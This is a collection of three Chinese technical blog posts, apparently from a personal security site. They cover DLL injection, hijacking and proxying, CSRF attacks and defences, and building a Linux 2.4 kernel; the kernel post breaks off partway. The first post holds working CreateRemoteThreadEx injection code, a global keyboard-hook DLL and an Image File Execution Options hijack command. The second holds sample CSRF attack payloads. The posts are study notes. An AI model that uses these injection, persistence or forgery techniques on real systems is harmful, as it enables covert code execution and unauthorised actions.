[{"content":"static library and dynamic library 静态库空间浪费\n静态库对程序的更新、部署和发布页会带来麻烦\n动态库在程序编译时并不会被连接到目标代码中，而是在程序运行是才被载入。不同的应用程序如果调用相同的库，那么在内存里只需要有一份该共享库的实例，规避了空间浪费问题。\n  在Windows系统下的执行文件格式是PE格式，动态库需要一个DllMain函数做出初始化的入口，导出 extern \u0026ldquo;C\u0026rdquo; _declspec(dllexport) 导入 extern \u0026ldquo;C\u0026rdquo; _declspec(dllimport)\n  Linux下gcc编译的执行文件默认是ELF格式，不需要初始化入口，亦不需要函数做特别的声明，编写比较方便。\n  静态库对应的lib文件叫静态库，动态库对应的lib文件叫导入库。实际上静态库本身就包含了实际执行代码、符号表等等，而对于导入库而言，其实际的执行代码位于动态库中，导入库只包含了地址符号表等，确保程序找到对应函数的一些基本地址信息。\nLinux 静态链接库\n1 2 3 4 5 6 7  # gen StaticMath.o g++ -c StaticMath.cpp # gen libstaticmath.a ar -crv libstaticmath.a StaticMath.o # use libstaticmath.a g++ TestStaticLibrary.cpp -L../StaticLibrary -lstaticmath g++ TestStaticLibrary.cpp ../StaticLibrary/libstaticmath.a   Windows 静态链接库\n1 2 3 4 5 6 7 8  # gen StaticMath.obj cl /c StaticMath.cpp # gen StaticMath.lib lib StaticMath.obj # 属性配置-\u0026gt;常规-\u0026gt;配置类型-\u0026gt;应用程序(.exe)/动态库(.dll)/静态库(.lib) # use StaticMath.lib # 引用 # 属性配置-\u0026gt;链接器-\u0026gt;[(常规-\u0026gt;附加库目录)\u0026amp;(输入-\u0026gt;附加依赖项目)] or (命令行-\u0026gt;添加完整路径)   Linux 动态链接库\n1 2 3 4 5 6 7  # -fPIC(position independent code) -shared 共享库 g++ -fPIC -shared -o libdynmath.so DynamicMath.cpp # use libdynmath.so edit /etc/ld.so.conf.d/ ## or sudo cp libdynmath.so /usr/lib g++ TestDynamicLibrary.cpp -L../DynamicLibrary -ldynmath   Windows 动态链接库\n1 2  #include \u0026#34;DynamicMath.h\u0026#34;DynamicMath::add(a, b)   显式调用\n1 2 3 4 5 6 7 8 9 10 11 12 13  # linux #include \u0026lt;dlfcn.h\u0026gt; void * dlopen( const char * pathname, int mode ) void* dlsym(void* handle,const char* symbol)\t# 函数地址及变量地址 int dlclose (void *handle) # win #LoadLibrary加载DLL、GetProcAddress获取导出函数的函数指针、用完FreeLibrary HMODULE hMod = LoadLibrary(DLL路径) typedef int(*ADD_IMPORT) (int a,int b); ADD_IMPORT add_proc = (ADD_IMPORT) GetProcAddress(hMod,\u0026#34;Add\u0026#34;); int result = add_proc(1,2);   因为C++的name mangling，用extern \u0026ldquo;C\u0026quot;声明[非成员]函数 使用函数名作符号名\nDll injection dll注入即是让程序A强行加载程序B给定的a.dll，并执行程序B给定的a.dll里面的代码。\n应用程序一般会在以下情况使用dll注入技术来完成某些功能：\n1.为目标进程添加新的“实用”功能；\n2.需要一些手段来辅助调试被注入dll的进程；\n3.为目标进程安装钩子程序(API Hook)；\n注入dll的原则是值在需要的时间才注入我们的dll，并在不需要时及时卸载。\nInjecting DLL with remote thread context patching\n注册表 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\n中AppInit_DLLs键的值可以是一个dll的文件名或一组dll的文件名(通过逗号或空格来分隔)\nLoadAppInit_DLLs为1时表示AppInit_DLLs键有效\n这两个键值设定后，当应用程序启动并加载User32.dll时，会获得上述注册表键的值，并调用LoadLibrary来调用这些字符串中指定的每一个dll。这时每个被载入的dll可以完成相应的初始化工作。但是需要注意的是，由于被注入的dll是在进程生命期的早期被载入的，因此这些dll在调用函数时应慎重。调用Kernel32.dll中的函数应该没有问题，因为Kernel32.dll是在User32.dll载入前已被加载。但是调用其他的dll中的函数时应当注意，因为进程可能还未载入相应的dll，严重时可能会导致蓝屏。\nImage hijack Image File Execution Options子项的Debugger选项会在对应程序被点击执行时调用对应程序为调试器，但是如果是正常程序就相当被劫持了。再次运行notepad.exe会跳出计算器\n1  reg add \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\u0026#34; /v Debugger /t REG_SZ /d C:\\Windows\\System32\\calc.exe   执行需要管理员权限，执行时杀软都会报毒\n至于新型利用 中说的新静默关闭启动监视器的劫持方式无论在win10还是win7中都没有复现成功\n调试器可以在被调试进程中执行很多特殊操作，操作系统载入一个被调试程序的时候，会在被调试的主线程尚未开始执行任何代码前，自动通知调试器(用来调试被调试进程的进程)，这时调试器可以将一些代码注入到被调试进程的地址空间中，保存被调试进程的CONTEXT结构，修改EIP指向我们注入的代码的起始位置执行这些代码。最后再让被调试的进程恢复原来的CONTEXT，继续执行。整个过程对被调试的进程而言好像没发生任何事情。\nAPC injection APC(Asynchronous Procedure Call) 注入原理\n1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断。\n2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。\n3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。\nCreateRemoteThread[Ex] 用到\u0026lt;tlhelp32.h\u0026gt;头文件中CreateToolhelp32Snapshot 方法，当指定TH32CS_SNAPPROCESS时可以保存系统中所有进程信息便于遍历。\n1 2 3 4 5 6 7 8 9 10 11 12  HANDLE CreateRemoteThreadEx( 进程句柄, NULL, 栈大小0默认, 待线程执行的函数指针, 传给函数的参数, 控制线程创建的标志0创建立即执行, 属性列表, 接收线程标识符的变量指针NULL不返回 ) // CreateRemoteThread Use the CreateRemoteThreadEx function to create a thread that runs in the virtual address space of another process and optionally specify extended attributes. // 参数只少第七个 (属性列表)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62  // 注入函数，同时返回值为是否注入成功，默认返回成功 BOOL Inject(LPCTSTR DLLPath, DWORD ProcessID) { // 定义一个句柄获取目标进程的所有权限，包括子进程 \tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, ProcessID); // 判读是否获取到 \tif (!hProcess) return FALSE; // 计算一下获取到的DLLpath究竟有多长，要在内存空间中申请内存来存放它，注意+1,为\\0 \tSIZE_T PathSize = (_tcslen(DLLPath) + 1) * sizeof(TCHAR); // 宽字节 \t// 在进程中申请内存存放此DLLpath \tLPVOID StartAddress = VirtualAllocEx(hProcess, NULL, PathSize, MEM_COMMIT, PAGE_READWRITE); // 如果未能获取到地址，返回失败 \tif (!StartAddress) return FALSE; // 获取到地址则将DLLPath写入此地址 \tif (!WriteProcessMemory(hProcess, StartAddress, DLLPath, PathSize, NULL)) return FALSE; // 获取LoadLibrary的入口点地址，需要进行强制类型转换 \tPTHREAD_START_ROUTINE pfnStartAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(_T(\u0026#34;kernel32.dll\u0026#34;)), \u0026#34;LoadLibraryW\u0026#34;); // 在这里获取到的地址，在目标进程中也一样，因此直接传递过去即可 \t// 先判断是否获取到 \tif (!pfnStartAddress) return FALSE; // 最重要的一步，创建远程线程，首先获取句柄，createremotethreadex函数只在win7以上系统有 \tHANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, NULL, pfnStartAddress, StartAddress, NULL, NULL, NULL); // 判断线程是否创建成功 \tif (!hThread) return FALSE; // 最后等待线程结束，然后清理线程和进程 \tWaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return TRUE; } // 获取进程，其参数为进程名——在进程列表中获取我们想要的参数 DWORD ProcessFind(LPCTSTR Exename) { // 第一个参数只获取进程名 \tHANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); // 对获取的进程进行判断 \tif (!hProcess) return FALSE; // 获取成功 \tPROCESSENTRY32 info; info.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hProcess, \u0026amp;info)) return FALSE; while (true) // 遍历进程中的所有项 \t{ // 判断是否与所给进程名相符，就是输入的进程名 \tif (_tcscmp(info.szExeFile, Exename) == 0) // 相符的话返回该进程的PID \treturn info.th32ProcessID; // 如果遍历了整个进程列表都没有找到，那么返回FALSE \tif (!Process32Next(hProcess, \u0026amp;info)) return FALSE; } // 函数默认返回FALSE \treturn FALSE; }   SetWindowsHook[Ex] 优点是注入简单，缺点是只能对windows消息进行Hook并注入dll，而且注入dll可能不是立即被注入，因为这需要相应类型的事件发生\n微软官方文档中有SetWindowsHookExA和SetWindowsHookExW两个接口，并且描述文档一模一样，区别可以在源码中看出来\n1 2 3 4 5  #ifdef UNICODE #define SetWindowsHookEx SetWindowsHookExW #else #define SetWindowsHookEx SetWindowsHookExA #endif // !UNICODE   1 2 3 4 5 6  HHOOK SetWindowsHookExA( [in] int idHook,\t// 钩子类型 WH_KEYBOARD 2 鼠标消息7 WinUser.h  [in] HOOKPROC lpfn,\t// 钩子函数的起始地址  [in] HINSTANCE hmod,\t// DLL handle 如果代码在当前进程中并且下一个参数指定当前进程创建的线程 则NULL  [in] DWORD dwThreadId\t// 与挂钩过程关联的线程的标识符 如果0 则与所有线程关联 \u0026#34;全局钩子\u0026#34; );   1 2 3 4  // 取消挂钩 BOOL UnhookWindowsHookEx( [in] HHOOK hhk );   拦截发送到notepad程序的键盘事件，每到一个事件就弹窗。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;conio.h\u0026gt;#include \u0026lt;tchar.h\u0026gt;#include \u0026lt;windows.h\u0026gt;typedef void(*PFNHOOKSTART)(); typedef void(*PFNHOOKSTOP)(); int main() { HMODULE Hmod = LoadLibraryA(\u0026#34;SetWindowsHook.dll\u0026#34;); PFNHOOKSTART pHookStart = (PFNHOOKSTART)GetProcAddress(Hmod, \u0026#34;HookStart\u0026#34;); PFNHOOKSTOP pHookStop = (PFNHOOKSTOP)GetProcAddress(Hmod, \u0026#34;HookStop\u0026#34;); pHookStart(); // printf(\u0026#34;print \u0026#39;q\u0026#39; to quite!\\n\u0026#34;);  // while (_getch() != \u0026#39;q\u0026#39;);  // pHookStop();  // FreeLibrary(Hmod);  return 0; }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  // dllmain.cpp : 定义 DLL 应用程序的入口点。 #include \u0026#34;pch.h\u0026#34;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;tchar.h\u0026gt;#include \u0026lt;windows.h\u0026gt; #pragma warning(disable : 4996) HHOOK ghHook = NULL; HINSTANCE ghInstance = NULL; LRESULT CALLBACK KeyboardProc( _In_ int code, _In_ WPARAM wParam, _In_ LPARAM lParam ) { TCHAR szPath[MAX_PATH] = { 0, }; TCHAR sProcessName[MAX_PATH] = { 0, }; if (code == 0 \u0026amp;\u0026amp; !(lParam \u0026amp; 0x80000000)) //如果是释放按键  { GetModuleFileName(NULL, szPath, MAX_PATH); _wsplitpath(szPath, NULL, NULL, sProcessName, NULL); if (0 == _wcsicmp(sProcessName, L\u0026#34;notepad\u0026#34;)) //如果进程名是notepad  { MessageBox(NULL, L\u0026#34;ruokeqx\u0026#34;, L\u0026#34;hello\u0026#34;, NULL); return 1; //删除消息，不再往下传递  } } return CallNextHookEx(ghHook, code, wParam, lParam); //继续传递消息 } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: ghInstance = hModule;//获得本实例的模块句柄  break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } extern \u0026#34;C\u0026#34; { __declspec(dllexport) void HookStart() { ghHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, ghInstance, 0); } __declspec(dllexport) void HookStop() { if (ghHook) { UnhookWindowsHookEx(ghHook); ghHook = NULL; } } }   CreateProcess CreateProcess()这个API第六个参数设置为CREATE_SUSPENDED,进而创建一个挂起状态的进程，利用这个进程状态进行远程线程注入DLL，然后用ResumeThread()函数恢复进程。\n依赖可信进程注入 首先将a.dll注入到诸如Services.exe等权限较高的进程中，然后利用a.dll将b.dll远程线程注入到待注入进程中\n利用完成后为影藏可以使用FreeLibraryAndExitThread()，其将dll自身卸载掉并且退出线程。\nComRes注入/输入法注入\nReflective DLL Injection Dll hijacking\u0026amp;proxying dll代理是特殊的dll劫持，其原理图如下，本质是个wrapper，将正常的执行重定向到真的dll，然后wrapper添加额外的功能，load的时候程序先load proxy，proxy再load real dll。\nDLL Proxying is achieved through a DLL Wrapper. The idea is very simple and quite self-explanatory at this point. A DLL Wrapper consists in redirecting all the functions to the original DLL using forwarders. In a typical DLL, the Export Table contains a list of addresses that point to the code of each exported function inside the PE file. But, there is a second option: it can also contain Forwarders. Instead of referencing some code inside the DLL itself, a Forwarder points to a string, which gives the name (or the ordinal number) of the exported function and the name of the DLL in which it can be found (e.g.: FOO.DummyFunction or FOO.#47). This feature is exactly what we need in order to transparently redirect all the functions to the orignal DLL as described on this diagram.\nContext menu Persistance 因为Context menu自动运行的特征，通过explorer.exe加载的dll可以实现持久化\n使用Sysinternals中程序Autoruns可以看到ContextMenu加载的dll\n创建一个proxy dll https://github.com/rek7/dll-hijacking\n1  python parse.py -d 7-zip.dll   生成头文件保存在definitions.h中，只要实现dllmain.cpp然后编译出dll即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  PS C:\\Program Files\\7-Zip\u0026gt; ls  目录: C:\\Program Files\\7-Zip Mode LastWriteTime Length Name ---- ------------- ------ ---- d---- 2022/1/20 21:10 Lang -a--- 2021/12/27 18:00 112890 7-zip.chm -a--- 2022/1/20 21:40 58880 7-zip.dll -a--- 2021/12/26 22:00 62976 7-zip32.dll -a--- 2021/12/26 22:00 93696 7-zip_.dll -a--- 2021/12/26 22:00 1710080 7z.dll -a--- 2021/12/26 22:00 535040 7z.exe -a--- 2021/12/26 22:00 215040 7z.sfx -a--- 2021/12/26 22:00 193536 7zCon.sfx -a--- 2021/12/26 22:00 945664 7zFM.exe -a--- 2021/12/26 22:00 667136 7zG.exe -a--- 2018/1/28 17:00 366 descript.ion -a--- 2021/12/27 16:52 54604 History.txt -a--- 2021/1/17 23:12 3990 License.txt -a--- 2021/12/26 21:54 1702 readme.txt -a--- 2021/12/26 22:00 14848 Uninstall.exe PS C:\\Program Files\\7-Zip\u0026gt;   经测试编译出来在本机win10可以代理成功，换到win7不能，应该是win接口变了吧。\nrefer https://uknowsec.cn/archives/ https://www.runoob.com/w3cnote/cpp-static-library-and-dynamic-library.html https://blog.raphael.karger.is/articles/2020-03/context-menu-persistance [context-menu-persistance]\nhttps://www.cnblogs.com/wf751620780/p/10730013.html#autoid-4-3-0 [dll hijacking]\nhttps://github.com/rek7/dll-hijacking [dll hijacking]\nhttps://www.apriorit.com/dev-blog/679-windows-dll-injection-for-api-hooks [dll hijacking]\nhttps://itm4n.github.io/dll-proxying/ [dll proxying]\nhttps://docs.microsoft.com/en-us/sysinternals/downloads/autoruns [autoruns.exe]\nhttps://blog.csdn.net/yuyan987/article/details/78558648 [message box]\nhttps://www.cnblogs.com/wf751620780/p/10730013.html [dll injection]\nhttps://blog.csdn.net/Cody_Ren/article/details/100053434 [dll injection]\nhttps://422926799.github.io/posts/9a523925.html [image hijack]\nhttps://docs.microsoft.com/zh-cn/visualstudio/debugger/specify-symbol-dot-pdb-and-source-files-in-the-visual-studio-debugger?view=vs-2022 [sys symbol]\nhttps://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot [CreateToolhelp32Snapshot]\nhttps://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex [CreateRemoteThreadEx api]\nhttps://blog.csdn.net/Cody_Ren/article/details/100041660 [CreateRemoteThreadEx]\nhttps://blog.csdn.net/weixin_43956962/article/details/105843803 [ReflectiveDLLInjection]\nhttps://github.com/stephenfewer/ReflectiveDLLInjection [ReflectiveDLLInjection]\nhttps://bbs.pediy.com/thread-260235.htm#msg_header_h1_0 [RDI analyze]\nhttps://docs.microsoft.com/en-us/windows/win32/debug/pe-format#export-address-table [PE format]\n","description":"","id":3,"section":"posts","tags":["red team","windows"],"title":"DLL注入及DLL劫持简单学习","uri":"https://ruokeqx.gitee.io/posts/dll-injection-and-dll-hijacking/"},{"content":"前言 CSRF的防护主要思想就是保证请求是从正确的网站发出的。\nCSRF攻击 攻击原理图如下，图片来自[1]\nGET型攻击 get型攻击仅需伪造一次get请求即可，危害程度大\n1  \u0026lt;img src=http://www.mybank.com/Transfer.php?toBankId=11\u0026amp;money=1000\u0026gt;   POST型攻击 1 2 3 4  \u0026lt;form action=http://wooyun.org/csrf.php method=POST\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;xx\u0026#34; value=\u0026#34;11\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt;   CSRF检测 CSRFTester 源码阅读：入口类为CSRFTester，构造函数创建UI，main中创建proxy，Proxy(new Framework()).run()\nCSRF防御 referer 网站B发出的请求referer为网站B，只需在后端判断referer是否同站即可防御CSRF。这样相当于把安全寄托于第三方，因为浏览器都不支持js对referer头的修改[4]\u0026amp;[5]，有的文章[6]说可以使用axios进行referer绕过，但是我测试后并不行。\nRefused to set unsafe header \u0026quot;referer\u0026quot;\rjs不允许修改referer头，但是hackbar可以添加任意头，是如何实现的呢。\nHackbar源码阅读 文件系统中搜索chrome插件id就很容易找到解包后源码的位置，可以发现连Hackbar都是大名鼎鼎的vue写的。\n搜索referer可以在index.js中看到commonRequestHeaders的函数列出常见的request头\n发现主要逻辑如下，就是通过v-model动态绑定vue对象data数据中headers中的值\n1 2 3 4 5 6 7 8 9 10  \u0026lt;v-btn id=\u0026#34;add-header-button\u0026#34; @click=\u0026#34;addHeader()\u0026#34;\u0026gt;Add Header\u0026lt;/v-btn\u0026gt; \u0026lt;v-layout class=\u0026#34;header-settings\u0026#34; align-center v-for=\u0026#34;(header, index) in request.headers\u0026#34; :key=\u0026#34;index\u0026#34;\u0026gt; \u0026lt;v-checkbox v-model=\u0026#34;header.enabled\u0026#34;\u0026gt;\u0026lt;/v-checkbox\u0026gt; \u0026lt;v-combobox dense class=\u0026#34;px-1 pt-2\u0026#34; label=\u0026#34;Name\u0026#34; v-model=\u0026#34;header.name\u0026#34; :items=\u0026#34;commonRequestHeaders()\u0026#34; @focus=\u0026#34;onFocus($event)\u0026#34; :menu-props=\u0026#39;{ \u0026#34;maxHeight\u0026#34;: 200 }\u0026#39;\u0026gt;\u0026lt;/v-combobox\u0026gt; \u0026lt;v-text-field class=\u0026#34;px-1\u0026#34; label=\u0026#34;Value\u0026#34; v-model=\u0026#34;header.value\u0026#34; @focus=\u0026#34;onFocus($event)\u0026#34; @keydown.stop\u0026gt;\u0026lt;/v-text-field\u0026gt; \u0026lt;v-btn icon text @click=\u0026#34;deleteHeader(index)\u0026#34;\u0026gt; \u0026lt;v-icon small\u0026gt;mdi-close\u0026lt;/v-icon\u0026gt; \u0026lt;/v-btn\u0026gt; \u0026lt;/v-layout\u0026gt;   headers只是存储数据，执行时调用chrome.runtime.connect()这个接口，他的第一个参数是extension id。\nThe ID of the extension or app to connect to. If omitted, a connection will be attempted with your own extension. Required if sending messages from a web page for web messaging.[7]\n1 2 3 4 5 6 7 8 9 10 11 12 13  this.backgroundPageConnection = chrome.runtime.connect() ... execute: function () { if (this.request.url.length === 0) { return } this.backgroundPageConnection.postMessage({ tabId: chrome.devtools.inspectedWindow.tabId, type: \u0026#39;execute\u0026#39;, data: this.request }) },   到这里可以知道了，hackbar使用的是浏览器提供的扩展程序接口，所以可以修改header\ncsrf token 也正是由于CSRF产生的原理，csrf_token不能放在cookie中，否则达不到防御CSRF的效果；csrf_token也无需每次都不一样(每次不同是防止重放攻击，若仅考虑CSRF则无需不同)。\n一般form表单加个hidden属性的input标签来存放。由于csrf_token存放在网站A的DOM中，这样网站B就无法获取token，即使伪造使得流量器访问网站A，A后端检测到没有token也不会允许请求。\n至于hidden这个属性，个人认为即使是明文也不影响对CSRF的防御，主要是减少用户感知。\n1 2 3 4 5 6 7 8  \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf_token\u0026#34; value=\u0026#34;{{csrf_token()}}\u0026#34;\u0026gt; 账号：\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; 密码:\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;提交\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt;   csrf_token的设计：基于攻击者无法得知cookie，最简单的可直接将sessionid等作为token(md5值等同理)；或者直接生成随机字符串\n添加http request头 添加额外的 HTTP 头属性，并把 token 值放入其中，比如叫 csrftoken\n从底层到高层XMLHttpRequest、Ajax、 Axios等都支持手动添加header头，较方便。个人认为不存在[1]中描述的局限性较大的问题。\n添加验证机制 在请求数据提交前，需填写验证码信息，以增加对用户来源的有效认证，防止恶意未授权的操作产生。\nFlask CSRF Strategy 如果没有指定允许POST，提交表单的时候会提示Method Not Allowed\n1 2 3 4 5 6 7 8 9 10  @app.route(\u0026#39;/\u0026#39;) def root(): if request.method == \u0026#34;GET\u0026#34;: return render_template(\u0026#34;form.html\u0026#34;) else: print(request.form) return \u0026#34;ok\u0026#34; ======================================== Method Not Allowed The method is not allowed for the requested URL.   如果允许了POST，再次尝试提交表单会Bad Request，这也是CSRF攻击未携带token的场景\n1 2 3 4 5 6 7 8 9 10  @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def root(): if request.method == \u0026#34;GET\u0026#34;: return render_template(\u0026#34;form.html\u0026#34;) else: print(request.form) return \u0026#34;ok\u0026#34; ======================================== Bad Request The CSRF token is missing.   如果template中添加token，在访问网站的时候请求到token，然后提交表单的时候将token也post出去，这样就能正确响应。尝试手动修改DOM中的token再次post也是bad request。\n1 2 3 4 5 6 7 8  \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf_token\u0026#34; value=\u0026#34;{{ csrf_token() }}\u0026#34;\u0026gt; 账号:\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; 密码:\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;提交\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt;   源码分析 https://github.com/wtforms/flask-wtf/blob/main/src/flask_wtf/csrf.py\nCSRFProtect类中init_app初始先对app进行一些参数的配置并用generate_csrf方法获取随机token并保存到session中；然后对app添加@app.before_request的hook，请求来时先检测app的参数配置，不符合直接return，然后进到protect方法，其中先validate_csrf(self._get_csrf_token())检测token是否与session中一致再使用same_origin方法检测referrer是否同源，如果是最后再表示请求是CSRF valid\n参考文献 [1] https://www.cnblogs.com/54chensongxia/p/11693666.html [csrf]\n[2] https://www.cnblogs.com/leijiangtao/p/11770647.html [flask csrf]\n[3] http://luckyzmj.cn/posts/a1b686d3.html#! [CSRFTester]\n[4] https://blog.csdn.net/neal1991/article/details/114609935 [js referer]\n[5] https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name [forbidden header name]\n[6] https://blog.csdn.net/Forever201295/article/details/80237134 [axios referer forgery]\n[7] https://developer.chrome.com/docs/extensions/reference/runtime/#method-connect [runtime.connect]\n[8] https://uknowsec.cn/posts/notes/CSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html [attack csrftester]\n[9] https://github.com/wtforms/flask-wtf/blob/main/src/flask_wtf/csrf.py [flask csrf source code]\n","description":"","id":4,"section":"posts","tags":["web","csrf"],"title":"CSRF攻击防御/Hackbar攻击原理及Flask防御策略研究","uri":"https://ruokeqx.gitee.io/posts/csrfad/"},{"content":"前言 操作系统课设上来就是远古版本2.4kernel，原地怀疑题目是不是复用了十多年了。虽然疯狂吐槽 还是想编译试试看.\n要求添加系统调用，想着是准备做一个内核流量捕获的简单工具，于是简单的了解了一下捕获流量的方法，看了一下libpcap和tcpdump的源码，了解了mapped memory和ring buffer的使用直接从网卡驱动摘下流量极大减少系统负载，但是由于事件仓促，最后却只是草草地写了个简单的系统调用版本并编译进内核使用qemu调试配合ping进行测试。\nBegin 要增加对某部分功能的支持，比如网络之类，可以把相应部分编译到内核中（build-in），也可以把该部分编译成模块（module），动态调用。如果编译到内核中，在内核启动时就可以自动支持相应部分的功能，这样的优点是方便、速度快，机器一启动，你就可以使用这部分功能了；缺点是会使内核变得庞大起来，不管你是否需要这部分功能，它都会存在，建议经常使用的部分直接编译到内核中，比如网卡。如果编译成模块，就会生成对应的.o文件，在使用的时候可以动态加载，优点是不会使内核过分庞大，缺点是你得自己来调用这些模块。\n环境\n1  Linux ruokeqx 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux   克隆内核源码（第二个链接会快点）\n1 2  git clone https://git.kernel.org/pub/scm/linux/kernel/git/wtarreau/linux-2.4.git/ git clone https://kernel.googlesource.com/pub/scm/linux/kernel/git/wtarreau/linux-2.4   安装编译环境\n1  sudo apt install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison   make menuconfig将打开一个配置工具，它可以让你遍历每个可用模块，然后启用或者禁用你需要或者不需要的模块。此处选择默认直接保存。\n尝试编译，报错如下：\n1  #error \u0026#34;GCC \u0026gt;= 4.2 miscompiles kernel 2.4, do not use it!\u0026#34;   需要版本小于4.2的GCC\n编译 编译安装GCC4.1.2 GCC官网下载源码http://ftp.gnu.org/gnu/gcc/gcc-4.1.2/gcc-4.1.2.tar.bz2\n安装依赖\n1  sudo apt-get install libc6-dev libgmp-dev libmpfr-dev texinfo   1 2 3 4 5 6 7 8 9  cd /usr/include sudo ln -s x86_64-linux-gnu/bits bits sudo ln -s x86_64-linux-gnu/gnu gnu sudo ln -s x86_64-linux-gnu/sys sys sudo ln -s x86_64-linux-gnu/asm asm cd /usr/lib sudo ln -s x86_64-linux-gnu/crt1.o crt1.o sudo ln -s x86_64-linux-gnu/crti.o crti.o sudo ln -s x86_64-linux-gnu/crtn.o crtn.o   编译GCC\n此处前半部分尝试使用ubuntu18.04 gcc7.x编译，后来问题很多改用ubuntu14.04 gcc4.8.4编译通过。\n1 2 3 4 5  $ cd gcc-4.0.0 $ mkdir build $ cd build $ ../configure --prefix=/usr/local --program-prefix=sse- --libexecdir=/usr/local/lib --enable-shared --enable-threads=posix --enable-__cxa_atexit --enable-clocale=gnu --disable-multilib --enable-languages=c,c++ $ make bootstrap MAKEINFO=makeinfo   1 2 3 4  ../../gcc/toplev.c:547:1: error: redefinition of ‘floor_log2’ floor_log2 (unsigned HOST_WIDE_INT x) ../../gcc/toplev.c:582:1: error: redefinition of ‘exact_log2’ exact_log2 (unsigned HOST_WIDE_INT x)   https://stackoverflow.com/questions/34569458/error-occurred-compiling-gcc-from-source-code\n修改Makefile\n1 2  CC = gcc -fgnu89-inline CXX = g++ -fgnu89-inline   Make再次出错\n1 2 3 4  In function ‘open’, inlined from ‘collect_execute’ at ../../gcc/collect2.c:1577:20: /usr/include/x86_64-linux-gnu/bits/fcntl2.h:50:4: error: call to ‘__open_missing_mode’ declared with attribute error: open with O_CREAT or O_TMPFILE in second argument needs 3 arguments __open_missing_mode ();   1 2 3  ~/project/gcc-4.0.0/gcc \u0026gt; vim collect2.c +1577 redir_handle = open (redir, O_WRONLY | O_TRUNC | O_CREAT, 0777);   （后续还有好多问题，暂时放弃。。\n折回原位，选用ubuntu14.04，自带gcc版本4.8.4，按照上面的修改Makefile两行即可直接编译一遍过。\n1 2 3  sudo make install sudo ln -sf /usr/local/bin/x86_64-unknown-linux-gnu-gcc-4.1.2 /usr/bin/gcc sudo ln -sf /usr/local/bin/x86_64-unknown-linux-gnu-sse-g++ /usr/bin/g++   验证安装\n1 2 3 4 5 6 7 8 9 10 11 12 13  ruokeqx@ruokeqx:~$ gcc --version gcc (GCC) 4.1.2 Copyright (C) 2006 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. ruokeqx@ruokeqx:~$ g++ --version g++ (GCC) 4.1.2 Copyright (C) 2006 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or 